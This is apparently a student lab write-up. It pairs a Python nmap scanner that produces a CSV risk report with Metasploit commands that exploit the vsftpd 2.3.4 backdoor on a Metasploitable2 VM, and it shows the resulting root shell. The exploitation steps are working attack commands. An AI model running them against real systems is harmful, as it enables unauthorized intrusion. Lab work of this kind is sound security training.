Automated Reconnaissance , Vulnerability Validation, and exploitation of a Metasploitable2
Tools
Language: Python 3.x
Libraries: python-Nmap, socket, csv
Environment: Kali Linux(Attacker), Metasploitable 2(Target)
Framework: Metasploit(MSF)
Automated Reconnaissance(Python Script)
Key Features
•	Version detection
•	Risk Categorization
•	Reporting
1:Navigate to the desktop 
cd Desktop  
 2:Create a working directory                                                                                                                                                                                                                             
mkdir -p Sylvester_Labs/Lab1_Network_Recon
3:Create the environment:	`
python3 -m venv venv
 4:Activate the environment                                                                                                                                                                                                                                    
source venv/bin/activate
 5:Install the library inside the bubble                                                                                                                                                                                                                             
pip install python-nmap
6:Script Writing-utilize the built in nano editor
nano recon_tool.py
7:Once the editor opens,paste python code (Ctrl+0, Enter, and Ctrl+X) to save and exit
Code
import nmap
import csv
from datetime import datetime

def cyber_scan(target):
    scanner = nmap.PortScanner()
    print(f"--- Starting Scan on {target} at {datetime.now()} ---")
    
    # Scanning for common ports 20-1024 + service version detection
    scanner.scan(target, '20-1024', '-sV')
    
    scan_data = []
    
    for host in scanner.all_hosts():
        print(f"Host Found: {host} ({scanner[host].hostname()})")
        for proto in scanner[host].all_protocols():
            ports = scanner[host][proto].keys()
            for port in ports:
                state = scanner[host][proto][port]['state']
                service = scanner[host][proto][port]['name']
                version = scanner[host][proto][port]['product']
                
                # Flagging insecure protocols (EHEv1 Concept)
                risk = "High" if service in ['telnet', 'ftp', 'http'] else "Standard"
                
                scan_data.append({
                    "IP": host,
                    "Port": port,
                    "Service": service,
                    "Version": version,
                    "State": state,
                    "Risk_Level": risk
                })

    return scan_data

def save_to_csv(data):
    keys = data[0].keys()
    filename = f"scan_report_{datetime.now().strftime('%Y%m%d')}.csv"
    with open(filename, 'w', newline='') as output_file:
        dict_writer = csv.DictWriter(output_file, fieldnames=keys)
        dict_writer.writeheader()
        dict_writer.writerows(data)
    print(f"--- Report Generated: {filename} ---")

if __name__ == "__main__":
    target_ip = input("Enter target IP or Network (e.g., 192.168.1.1): ")
    results = cyber_scan(target_ip)
    if results:
        save_to_csv(results)
    else:
        print("No open ports found.")
8: Run the script
./venv/bin/python recon_tool.py if not on root,run with sudo
9:Print the report on terminal
column -t -s, recon_20260127_1423.csv
 

Exploiting vsftpd 2.3.4 using Metasploit
Start Metasploit
 msfconsole -q
Set exploit
use exploit/unix/ftp/vsftpd_234_backdoor
Set Parameters
set RHOSTS 10.0.2.3
Run the exploit
Run
Summary
This project demonstrates automated reconnaissance to successful exploitation of a metasplotable2 machine. The python-based scanner identifies the attack surfaces available in the target machine.
Proof of concept(PoC)
msf exploit(unix/ftp/vsftpd_234_backdoor) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               10.0.2.15:40031 -> 10.0.2.3:6200 (10.0.2.3)

msf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1
[*] Starting interaction with 1...

whoami
root
id
uid=0(root) gid=0(root)
                        
